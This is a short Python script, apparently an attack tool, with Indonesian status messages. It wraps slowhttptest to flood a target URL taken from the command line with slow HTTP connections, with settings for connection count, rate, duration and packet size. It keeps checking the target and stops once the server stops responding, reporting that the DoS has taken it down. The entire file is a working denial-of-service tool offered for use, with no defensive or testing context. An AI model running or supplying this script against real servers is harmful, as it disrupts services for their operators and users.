import subprocess
import requests
import time
import sys

def is_server_down(url):
    try:
        r = requests.get(url, timeout=3)
        return r.status_code != 200
    except:
        return True

def run_dos_attack(url, requests_num, duration, packet_size, header=None):
    cmd = [
        'slowhttptest',
        '-c', str(requests_num),
        '-r', '200',
        '-l', str(duration),
        '-s', str(packet_size),
        '-u', url,
        '-t', 'X',
        '-p', '3'
    ]
    if header:
        cmd += ['-j', f"{header}"]

    process = subprocess.Popen(cmd)
    time.sleep(5)
    while process.poll() is None:
        if is_server_down(url):
            process.terminate()
            return '✅ DoS dihentikan karena server tidak responsif.'
        time.sleep(2)
    return '✅ DoS selesai tanpa membuat server down.'

if __name__ == '__main__':
    url, reqs, dur, pkt = sys.argv[1:5]
    header = sys.argv[5] if len(sys.argv) > 5 else None
    print(run_dos_attack(url, int(reqs), int(dur), int(pkt), header))
